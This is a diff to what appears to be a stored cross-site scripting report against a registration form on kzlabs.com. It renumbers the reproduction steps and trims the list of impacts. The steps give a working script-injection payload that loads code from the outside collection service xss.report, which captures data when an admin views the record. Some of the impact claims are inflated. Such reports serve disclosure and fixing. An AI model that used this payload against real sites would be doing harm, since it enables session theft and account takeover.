@@ -17,10 +17,10 @@ http://kzlabs.com/63.php
 ## Steps to Reproduce : 
 
 1. Register for New Account at `https://kzlabs.com/60.php`.
-4. In the Full Name field and Company Name enter the following payload: `'"><script src=https://xss.report/c/xamoo></script>` ( Note payload is taken from website : https://xss.report/ . Notes create account here and take any payload from XSS Payload Section . then add it here implace of my payload because xss result will appear in XSS report section in this website)
-5. Fill in the remaining required fields (Email, Password, etc.) and Create a New Account.
-6. Once the Account is Created, When a admin View thee page where the payload is stored / Account data is store . 
-7. Check https://xss.report/ website , check Xss report section You will get every detail.
+2. In the Full Name field and Company Name enter the following payload: `'"><script src=https://xss.report/c/xamoo></script>` ( Note payload is taken from website : https://xss.report/ . Notes create account here and take any payload from XSS Payload Section . then add it here implace of my payload because xss result will appear in XSS report section in this website)
+3. Fill in the remaining required fields (Email, Password, etc.) and Create a New Account.
+4. Once the Account is Created, When a admin View thee page where the payload is stored / Account data is store . 
+5. Check https://xss.report/ website , check Xss report section You will get every detail.
    
 
 ## Payload Used
@@ -46,10 +46,6 @@ https://github.com/user-attachments/assets/572dad72-23c1-44b6-ab02-e02f4df02d45
  An attacker can perform the following actions using this vulnerability:
  
  - Full account takeover without user interaction — hijack session, reset password, or link attacker’s OAuth
- - Execute silent CSRF attacks — change email, add admin, transfer funds, or modify settings in the background
- - Turn the page into a persistent drive-by download — infect visitors with malware or keyloggers
- - Leak entire backend data — read internal files, API responses, or database dumps via internal fetch
- - Deploy a self-spreading worm — each compromised user automatically attacks their own session and propagates
  - Ransom every admin — lock critical functions (e.g., disable admin panel, delete logs) until payment
   
 ## Recommendations for fix:
